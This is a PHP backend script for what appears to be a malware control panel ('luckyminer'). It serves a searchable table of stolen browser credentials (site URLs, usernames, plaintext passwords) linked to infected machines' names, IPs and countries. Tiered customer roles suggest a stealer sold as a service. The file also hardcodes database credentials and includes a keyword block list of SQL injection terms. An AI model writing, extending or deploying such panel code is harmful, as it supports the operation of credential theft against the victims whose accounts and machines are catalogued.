<?php
session_start();

// Set content type to JSON
header('Content-Type: application/json');

// Validate session data
$role = $_SESSION['Role'] ?? '';
$username = $_SESSION['admin_name'] ?? '';
$secretkey = $_SESSION['secret_key'] ?? '';

/**
 * Validate string length
 */
function isStringLengthGreaterThan5($inputString) {
    return is_string($inputString) && strlen($inputString) > 5;
}

/**
 * Enhanced input sanitization with strict validation
 */
function sanitizeInput($input) {
    if (!is_string($input) || empty($input)) {
        return '';
    }
    
    // Define forbidden characters and SQL keywords
    $forbiddenChars = ['(', ')', '=', '*', ';', '--', '/*', '*/', 'union', 'select', 'insert', 'update', 'delete', 'drop'];
    
    $input_lower = strtolower($input);
    
    // Check for forbidden characters and SQL keywords
    foreach ($forbiddenChars as $char) {
        if (strpos($input_lower, strtolower($char)) !== false) {
            return '';
        }
    }
    
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

/**
 * Validate user permissions
 */
function validateUserPermissions($role, $secretkey, $username) {
    if (empty($role) || empty($secretkey) || empty($username)) {
        return false;
    }
    
    $validRoles = ['Founder', 'Admin', 'Special', 'Premium', 'Trial', 'User'];
    return in_array($role, $validRoles);
}

/**
 * Create secure database connection using PDO
 */
function createDatabaseConnection() {
    $host = 'localhost';
    $dbname = 'luckyminer';
    $db_username = 'miner';
    $db_password = 'Sifre.12345';
    
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8mb4", $db_username, $db_password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        return $pdo;
    } catch (PDOException $e) {
        error_log("Database connection failed: " . $e->getMessage());
        return false;
    }
}

/**
 * Truncate text for display
 */
function truncateText($text, $maxLength) {
    if (strlen($text) > $maxLength) {
        return substr($text, 0, $maxLength) . '...';
    }
    return $text;
}

/**
 * Get browser name from browser ID
 */
function getBrowserName($browserId) {
    $browsers = [
        '1' => 'Edge',
        '2' => 'Chrome',
        '3' => 'Brave'
    ];
    
    return $browsers[$browserId] ?? 'Unknown';
}

/**
 * Get user ID from accounts table
 */
function getUserId($pdo, $secretkey) {
    $stmt = $pdo->prepare("SELECT id FROM accounts WHERE OwnerKey = :owner_key");
    $stmt->bindValue(':owner_key', $secretkey, PDO::PARAM_STR);
    $stmt->execute();
    $result = $stmt->fetch();
    
    return $result ? $result['id'] : null;
}

// Main execution
try {
    // Validate HTTP method
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Invalid request method');
    }
    
    // Validate session and permissions
    if (!validateUserPermissions($role, $secretkey, $username) || !isStringLengthGreaterThan5($secretkey)) {
        http_response_code(403);
        echo json_encode(['error' => 'Access denied - Invalid session or insufficient permissions']);
        exit;
    }
    
    // Create database connection
    $pdo = createDatabaseConnection();
    if (!$pdo) {
        http_response_code(500);
        echo json_encode(['error' => 'Database connection failed']);
        exit;
    }
    
    // Validate and sanitize DataTables parameters
    $draw = filter_input(INPUT_POST, 'draw', FILTER_VALIDATE_INT);
    $start = filter_input(INPUT_POST, 'start', FILTER_VALIDATE_INT);
    $length = filter_input(INPUT_POST, 'length', FILTER_VALIDATE_INT);
    
    if ($draw === false || $start === false || $length === false) {
        throw new Exception('Invalid DataTables parameters');
    }
    
    // Limit length to prevent excessive data retrieval
    $length = min($length, 1000);
    
    // Get and validate search value
    $searchValue = '';
    if (isset($_POST['search']['value'])) {
        $rawSearchValue = $_POST['search']['value'];
        $sanitizedSearch = sanitizeInput($rawSearchValue);
        if (!empty($sanitizedSearch) && strlen($sanitizedSearch) > 0) {
            $searchValue = substr($sanitizedSearch, 0, 100); // Limit to 100 chars for security
        }
    }
    
    // Define sortable columns (whitelist approach)
    $sortableColumns = [
        0 => 'passwords.Urls',
        1 => 'passwords.Username',
        2 => 'passwords.Pass',
        3 => 'passwords.Browser',
        4 => 'miners.PcName',
        5 => 'passwords.PassID'
    ];
    
    // Validate sorting parameters
    $orderColumnIndex = filter_input(INPUT_POST, 'order', FILTER_DEFAULT, FILTER_REQUIRE_ARRAY);
    $orderColumn = 'passwords.PassID'; // Default sort column
    $orderDirection = 'DESC'; // Default sort direction
    
    if (is_array($orderColumnIndex) && isset($orderColumnIndex[0]['column']) && isset($orderColumnIndex[0]['dir'])) {
        $columnIndex = intval($orderColumnIndex[0]['column']);
        $direction = strtoupper($orderColumnIndex[0]['dir']);
        
        if (isset($sortableColumns[$columnIndex]) && in_array($direction, ['ASC', 'DESC'])) {
            $orderColumn = $sortableColumns[$columnIndex];
            $orderDirection = $direction;
        }
    }
    
    // Build role-based WHERE clause
    $baseWhere = "WHERE 1 = 1";
    $params = [];
    
    if ($role === "Founder") {
        if ($username !== "Hopesar") {
            $baseWhere .= " AND passwords.OwnerID NOT LIKE :exclude_owner";
            $params['exclude_owner'] = '%2%';
        }
    } else {
        // Get user ID for non-founder roles
        $userId = getUserId($pdo, $secretkey);
        if ($userId === null) {
            throw new Exception('Invalid user credentials');
        }
        
        $baseWhere .= " AND passwords.OwnerID = :owner_id";
        $params['owner_id'] = $userId;
    }
    
    // Add search conditions if search value exists
    $searchWhere = "";
    if (!empty($searchValue)) {
        $searchWhere = " AND (
            passwords.Urls LIKE :search1 OR
            passwords.Username LIKE :search2 OR
            passwords.Pass LIKE :search3 OR
            miners.PcName LIKE :search4
        )";
        $searchPattern = '%' . $searchValue . '%';
        $params['search1'] = $searchPattern;
        $params['search2'] = $searchPattern;
        $params['search3'] = $searchPattern;
        $params['search4'] = $searchPattern;
    }
    
    // Build the main data query
    $dataQuery = "SELECT DISTINCT passwords.Urls, passwords.Username, passwords.Pass, 
                         passwords.Browser, passwords.PassID,
                         miners.PcName, 
                         CONCAT(miners.IP, ' | ', miners.Country) AS IPCOUNTRaY
                  FROM passwords
                  LEFT JOIN miners ON passwords.HWID = miners.BotID
                  $baseWhere $searchWhere 
                  ORDER BY $orderColumn $orderDirection 
                  LIMIT :start, :length";
    
    $stmt = $pdo->prepare($dataQuery);
    
    // Bind parameters
    foreach ($params as $key => $value) {
        $stmt->bindValue(":$key", $value, PDO::PARAM_STR);
    }
    $stmt->bindValue(':start', $start, PDO::PARAM_INT);
    $stmt->bindValue(':length', $length, PDO::PARAM_INT);
    
    $stmt->execute();
    $results = $stmt->fetchAll();
    
    // Process results
    $data = [];
    foreach ($results as $row) {
        // Sanitize and truncate fields
        $urls = htmlspecialchars($row['Urls'] ?? '', ENT_QUOTES, 'UTF-8');
        $username_field = htmlspecialchars($row['Username'] ?? '', ENT_QUOTES, 'UTF-8');
        $password = htmlspecialchars($row['Pass'] ?? '', ENT_QUOTES, 'UTF-8');
        $pcName = htmlspecialchars($row['PcName'] ?? '', ENT_QUOTES, 'UTF-8');
        $ipCountry = htmlspecialchars($row['IPCOUNTRaY'] ?? '', ENT_QUOTES, 'UTF-8');
        
        // Truncate long values for display
        $truncatedUrls = truncateText($urls, 27);
        $truncatedUsername = truncateText($username_field, 22);
        $truncatedPassword = truncateText($password, 22);
        
        // Get browser name
        $browserName = getBrowserName($row['Browser'] ?? '');
        
        // Create secure clickable links
        $urlLink = '<a href="javascript:void(0);" class="hover-link" onclick="opensite(\'' . $urls . '\')">' . $truncatedUrls . '</a>';
        $usernameLink = '<a href="javascript:void(0);" class="hover-link" onclick="copyText(\'' . $username_field . '\')">' . $truncatedUsername . '</a>';
        $passwordLink = '<a href="javascript:void(0);" class="hover-link" onclick="copyText(\'' . $password . '\')">' . $truncatedPassword . '</a>';
        
        $data[] = [
            $urlLink,
            $usernameLink,
            $passwordLink,
            $browserName,
            $pcName,
            $ipCountry
        ];
    }
    
    // Get total count
    $countQuery = "SELECT COUNT(DISTINCT passwords.PassID) as total 
                   FROM passwords
                   LEFT JOIN miners ON passwords.HWID = miners.BotID
                   $baseWhere $searchWhere";
    
    $countStmt = $pdo->prepare($countQuery);
    
    // Bind the same parameters for count query (excluding LIMIT params)
    foreach ($params as $key => $value) {
        $countStmt->bindValue(":$key", $value, PDO::PARAM_STR);
    }
    
    $countStmt->execute();
    $totalRecords = $countStmt->fetch()['total'];
    
    // Prepare response
    $response = [
        'draw' => $draw,
        'recordsTotal' => intval($totalRecords),
        'recordsFiltered' => intval($totalRecords),
        'data' => $data
    ];
    
    echo json_encode($response, JSON_UNESCAPED_UNICODE);
    
} catch (Exception $e) {
    // Log error and return generic error response
    error_log("Passwords DataTables Error: " . $e->getMessage());
    
    http_response_code(500);
    echo json_encode([
        'draw' => $draw ?? 0,
        'recordsTotal' => 0,
        'recordsFiltered' => 0,
        'data' => [],
        'error' => 'An error occurred while processing your request'
    ]);
}
?>